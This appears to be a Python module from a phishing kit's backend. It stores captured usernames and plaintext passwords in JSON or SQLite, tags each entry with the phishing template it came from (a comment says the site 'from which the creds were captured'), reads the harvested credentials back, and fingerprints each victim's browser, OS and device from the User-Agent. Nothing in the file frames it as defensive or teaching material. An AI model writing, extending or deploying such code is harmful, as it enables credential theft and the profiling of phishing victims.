import os
import json
import threading
import sqlite3
import logging
from core.config import Config

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
from user_agents import parse


# def save_credentials(username, password, device_info):
#     entry = {
#         "username": username,
#         "password": password,
#         "device": device_info
#     }
#     # Use a background thread to save the data so that the response is not delayed.
#     thread = threading.Thread(target=save_entry, args=(entry,))
#     thread.start()

def save_credentials(username, password, device_info, site):
    entry = {
        "username": username,
        "password": password,
        "device": device_info,
        "template": site  # Save the template/site from which the creds were captured
    }
    # Save to JSON or DB as configured (here’s the JSON example)
    path = Config.JSON_STORAGE_PATH
    # Ensure the directory exists
    os.makedirs(os.path.dirname(path), exist_ok=True)
    if not os.path.exists(path):
        with open(path, 'w') as f:
            json.dump([], f)
    with open(path, 'r') as f:
        try:
            data = json.load(f)
        except json.JSONDecodeError:
            data = []
    data.append(entry)
    with open(path, 'w') as f:
        json.dump(data, f, indent=4)


def save_entry(entry):
    try:
        if Config.STORAGE_TYPE == 'json':
            path = Config.JSON_STORAGE_PATH
            # Ensure the directory exists
            os.makedirs(os.path.dirname(path), exist_ok=True)
            # If the file does not exist, initialize it with an empty list
            if not os.path.exists(path):
                with open(path, 'w') as f:
                    json.dump([], f)
            with open(path, 'r') as f:
                try:
                    data = json.load(f)
                except json.JSONDecodeError:
                    data = []
            data.append(entry)
            with open(path, 'w') as f:
                json.dump(data, f, indent=4)
        elif Config.STORAGE_TYPE == 'db':
            conn = sqlite3.connect(Config.SQLITE_DB_PATH)
            c = conn.cursor()
            c.execute('CREATE TABLE IF NOT EXISTS credentials (username TEXT, password TEXT, device TEXT)')
            c.execute('INSERT INTO credentials VALUES (?, ?, ?)',
                      (entry['username'], entry['password'], str(entry['device'])))
            conn.commit()
            conn.close()
        else:
            logging.error("Invalid storage type in configuration.")
    except Exception as e:
        logging.exception("Error in save_entry")


def load_json_credentials():
    path = Config.JSON_STORAGE_PATH
    if os.path.exists(path):
        with open(path, 'r') as f:
            try:
                return json.load(f)
            except Exception as e:
                logging.exception("Error loading JSON credentials")
                return []
    return []


def load_db_credentials():
    credentials = []
    try:
        conn = sqlite3.connect(Config.SQLITE_DB_PATH)
        c = conn.cursor()
        c.execute('SELECT username, password, device FROM credentials')
        rows = c.fetchall()
        for row in rows:
            credentials.append({"username": row[0], "password": row[1], "device": row[2]})
        conn.close()
    except Exception as e:
        logging.exception("Error loading DB credentials")
    return credentials


# def fingerprint(user_agent):
#     # Basic fingerprinting by analyzing the User-Agent string.
#     device_info = {"user_agent": user_agent}
#     if "Mobile" in user_agent:
#         device_info["device_type"] = "Mobile"
#     else:
#         device_info["device_type"] = "Desktop"
#     return device_info


def fingerprint(user_agent):
    ua = parse(user_agent)
    device_info = {
        "browser": ua.browser.family,
        "os": ua.os.family,
        "device": ua.device.family,
        "is_mobile": ua.is_mobile,
        "is_tablet": ua.is_tablet,
        "is_pc": ua.is_pc,
    }
    return device_info
